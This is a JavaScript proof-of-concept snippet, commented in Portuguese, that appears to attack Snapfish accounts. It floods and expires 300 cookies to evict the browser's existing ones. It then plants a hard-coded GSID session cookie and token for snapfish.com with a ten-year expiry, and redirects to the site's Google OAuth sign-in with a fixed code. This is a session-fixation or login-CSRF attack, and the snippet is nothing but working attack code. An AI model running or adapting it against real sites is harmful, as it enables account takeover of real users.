let quantidadeCookies = 300;
console.log(quantidadeCookies); // console
for (let i = 0; i < quantidadeCookies; i++) {
    document.cookie = `cookie${i}=a; Secure; path=/`;
    console.log(document.cookie)
}

// Remove os 300 cookies definidos anteriormente
for (let i = 0; i < quantidadeCookies; i++) {
    document.cookie = `cookie${i}=a; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/`;
}


const expires = new Date();
expires.setFullYear(expires.getFullYear() + 10);

document.cookie = `GSID=aus-27e95bb9-7d53-4fb5-92c4-3e5646cc8f53-31160; a2=sf_v1a%3Bdx1Rx3Tjip9bozPu5UiZUUz0vWMdLqYD3YJSWa%2BMAP3BMqjY9NbkMUR46F%2BC1yhbsO2VSiaEB%2BRHE2ItowKvrUKnGfa7ZVhYr1PSKOCudUjzghPlhyGxS0WxoolX4Phjy3yqXDB4GPUzL9JpmETJpQ2En0%2BOHMRMHkN%2FcsO98zM%3DdjsXI10vu04FsHzujt6XxBdAP9%2FQLo%2BAFp5odtDrO4uJpyVJaRsPvEmClWWoPc%2B55sXHOVvM88jnPLtraaRCgrzZToHWYhEQ3PH8Z1AVT8O3lCLt%2B9yJHgiBG1y%2FxKIJ%2B4Q1ZmNjCqEetFw41ovuH7bUuo86%2F2ftPehk1x296Sc%3D; Domain=snapfish.com; Path=/youraccount?tab=tab-1#deals; Expires=${expires.toUTCString()}`;

window.location.href = "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=484210975577308&SubscriptionFlag=ALL";

